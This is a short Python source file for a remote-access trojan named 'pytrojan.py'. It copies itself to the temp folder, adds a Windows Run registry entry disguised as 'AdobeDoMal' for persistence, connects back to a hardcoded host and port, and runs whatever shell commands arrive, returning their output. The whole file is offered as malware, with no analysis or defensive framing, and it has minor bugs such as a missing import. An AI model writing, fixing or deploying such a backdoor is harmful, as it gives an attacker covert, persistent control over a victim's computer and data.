import socket
import time
import tempfile
import os

LHOST = '192.168.0.106'
LPORT = 3000
FILENAME = 'pytrojan.py'
TEMPDIR = tempfile.gettempdir()


def autorun():
	try:
		os.system("copy" + FILENAME + " " + TEMPDIR)
	except:
		print('error in copy')
		pass


	try:
		FNULL = open(os.devnull, 'w')
		subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" "v AdobeDoMal /d " + TEMPDIR + "\\" + FILENAME, stdout=FNULL, stderr=FNULL)
	except:
		print('erro no reg')
		pass

def con(LHOST, LPORT):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((LHOST, LPORT))
		return(s)

	except Exception as e:
		print('CONNECTION REFUSED!\nTrying again...')
		return None

def listen(s):
	while True:
		msg = s.recv(1024)
		if msg[:-1] == 'exit':
			exit(0)
			s.close()
		else:
			cmd(s, msg[:-1])

			
def cmd(s, msg):

	proc = subprocess.Popen(msg, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	saida = proc.stdout.read() + proc.stderr.read()
	s.send(saida)

def main():
	while True:
		connectd = con(LHOST, LPORT)

		if connectd:
			listen(connectd)
		else:
			time.sleep(5)
main()